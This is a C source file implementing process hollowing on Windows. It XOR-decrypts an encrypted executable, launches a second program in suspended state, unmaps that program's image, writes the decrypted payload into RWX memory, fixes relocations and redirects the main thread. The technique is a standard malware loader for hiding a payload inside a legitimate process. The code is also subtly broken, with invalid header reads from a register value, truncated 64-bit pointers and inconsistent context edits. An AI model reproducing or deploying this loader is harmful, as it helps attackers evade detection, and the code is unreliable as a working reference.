#include <stdio.h>
#include <windows.h>

int main()
{
    // Step 1: Print a string
    printf("Hello Program 2\n");

    // Step 2: Open the encrypted program1 file
    FILE *input_file = fopen("program1_encrypted.exe", "rb");
    if (input_file == NULL)
    {
        printf("Failed to open input file.\n");
        return 1;
    }

    // Step 3: Decrypt the program1 file
    char encryption_key = 0x40;
    fseek(input_file, 0, SEEK_END);
    long file_size = ftell(input_file);
    fseek(input_file, 0, SEEK_SET);
    char *buffer = malloc(file_size);
    fread(buffer, file_size, 1, input_file);
    for (int i = 0; i < file_size; i++)
    {
        buffer[i] ^= encryption_key;
    }

    // Step 4: Create the process in suspended form
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    if (!CreateProcess("program2.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        printf("Failed to create process.\n");
        return 1;
    }

    // Step 5: Get the context of program2
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx))
    {
        printf("Failed to get thread context.\n");
        return 1;
    }

    // Step 6: Unmap the program2 image
    typedef NTSTATUS(WINAPI * PFNNtUnmapViewOfSection)(HANDLE, PVOID);

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ctx.Rbx;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD)dos_header + dos_header->e_lfanew);
    HANDLE hProcess = pi.hProcess;
    LPVOID image_base = (LPVOID)nt_headers->OptionalHeader.ImageBase;

    PFNNtUnmapViewOfSection pfnNtUnmapViewOfSection = (PFNNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (!pfnNtUnmapViewOfSection)
    {
        printf("Failed to get NtUnmapViewOfSection function address.\n");
        return 1;
    }

    NTSTATUS status = pfnNtUnmapViewOfSection(hProcess, image_base);
    if (status != 0)
    {
        printf("Failed to unmap view of section. Error code: 0x%x\n", status);
        return 1;
    }

    // Step 7: Allocate space for program1
    LPVOID new_image_base = VirtualAllocEx(hProcess, image_base, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (new_image_base == NULL)
    {
        printf("Failed to allocate space.\n");
        return 1;
    }

    // Step 8: Write program1 to the allocated space
    if (!WriteProcessMemory(hProcess, new_image_base, buffer, nt_headers->OptionalHeader.SizeOfHeaders, NULL))
    {
        printf("Failed to write process memory.\n");
        return 1;
    }
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers) + i;
        LPVOID dest = (LPVOID)((DWORD)new_image_base + section->VirtualAddress);
        if (!WriteProcessMemory(hProcess, dest, buffer + section->PointerToRawData, section->SizeOfRawData, NULL))
        {
            printf("Failed to write process memory.\n");
            return 1;
        }
    }

    // Step 9 (continued): Repair the relocation table if necessary
    DWORD delta = (DWORD)new_image_base - nt_headers->OptionalHeader.ImageBase;
    if (delta != 0)
    {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((DWORD)nt_headers + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress != 0)
        {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD list = (PWORD)((DWORD)reloc + sizeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < count; i++)
            {
                if (((*list) >> 12) == IMAGE_REL_BASED_HIGHLOW)
                {
                    PDWORD ptr = (PDWORD)((DWORD)new_image_base + (reloc->VirtualAddress + ((*list) & 0x0FFF)));
                    (*ptr) += delta;
                }
                list++;
            }
            reloc = (PIMAGE_BASE_RELOCATION)((DWORD)reloc + reloc->SizeOfBlock);
        }
    }

    // Step 10: Modify the Context of program2
    ctx.Rbx = (DWORD)new_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
    ctx.Rbx = (ULONGLONG)new_image_base;
#else
    ctx.Ebx = (DWORD)new_image_base;
#endif

    // Step 11: Set the Context and restore the main thread
    if (!SetThreadContext(pi.hThread, &ctx))
    {
        printf("Failed to set thread context.\n");
        return 1;
    }
    ResumeThread(pi.hThread);

    // Step 12: Exit gracefully
    free(buffer);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
